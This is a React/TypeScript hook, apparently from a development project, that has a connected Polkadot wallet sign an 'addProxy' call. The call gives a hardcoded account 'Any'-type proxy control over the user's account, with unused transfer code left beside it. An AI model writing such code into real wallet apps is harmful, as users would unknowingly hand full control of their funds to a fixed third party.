import { useCallback, useState } from 'react';
import { ApiPromise, WsProvider } from '@polkadot/api';
import { web3FromSource } from '@polkadot/extension-dapp';
import { InjectedAccountWithMeta } from '@polkadot/extension-inject/types';

export const useProxyCall = (account: InjectedAccountWithMeta | null, onSuccess: () => void) => {
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const [transactionSuccess, setTransactionSuccess] = useState(false);
  const clearError = useCallback(() => setErrorMessage(null), []);

  

  const addProxyCall = useCallback(async () => {
    if (!account) return;

    try {
      const wsProvider = new WsProvider('wss://soupcan1.jelliedowl.com');
      const api = await ApiPromise.create({ provider: wsProvider });
      const injector = await web3FromSource(account.meta.source as string);

      api.setSigner(injector.signer);

      const delay = 2000;
      const amount = 25 * 1e12;
      const recipientAccount = '5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY';
      const transfer = api.tx.balances.transfer(recipientAccount, amount);
      const proxyType = 'Any'; // Replace with the desired ProxyType
      const proxyCall = api.tx.proxy.proxy(account.address, proxyType, transfer);
      const addProxyCall = api.tx.proxy.addProxy(recipientAccount, proxyType, delay);



      await new Promise<void>((resolve, reject) => {
        addProxyCall.signAndSend(account.address, ({ events = [], status }) => {
          if (status.isFinalized) {
            console.log('Finalized', status.asFinalized.toHex());
            setTransactionSuccess(true);
            onSuccess();
            resolve();
          }
        }).catch((error: Error) => {
            console.log('Error:', error);
            setErrorMessage(error.message || 'An error occurred during the transaction.');
            reject(error);
          });
      });
    } catch (error) {
      console.error('Error:', error);
      setErrorMessage(error.message || 'An error occurred during the transaction.');
    }
  }, [account, onSuccess]);

  return { addProxyCall, errorMessage, clearError, transactionSuccess };
};

